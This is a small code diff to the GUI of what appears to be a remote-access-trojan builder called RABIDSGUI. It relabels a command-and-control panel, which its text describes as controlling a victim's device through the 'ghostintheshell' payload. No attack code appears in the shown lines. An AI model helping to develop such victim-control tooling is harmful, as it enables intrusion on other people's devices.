@@ -862,12 +862,12 @@ class RABIDSGUI(QMainWindow):
         c2_left_layout.setContentsMargins(0, 0, 0, 0)
         
         c2_header_layout = QHBoxLayout()
-        c2_title = QLabel("DISCORD C2")
+        c2_title = QLabel("COMMAND AND CONTROL")
         c2_title.setFont(title_font)
         c2_header_layout.addWidget(c2_title)
         c2_left_layout.addLayout(c2_header_layout)
 
-        c2_desc = QLabel("Connect to Discord to send commands to and receive output from the 'ghostintheshell' payload.")
+        c2_desc = QLabel("Connect to RAT to send commands to and receive output from the 'ghostintheshell' payload. \n Control victim's device remotely")
         c2_desc.setFont(subtitle_font)
         c2_desc.setStyleSheet("color: #00A9FD;")
         c2_desc.setWordWrap(True)
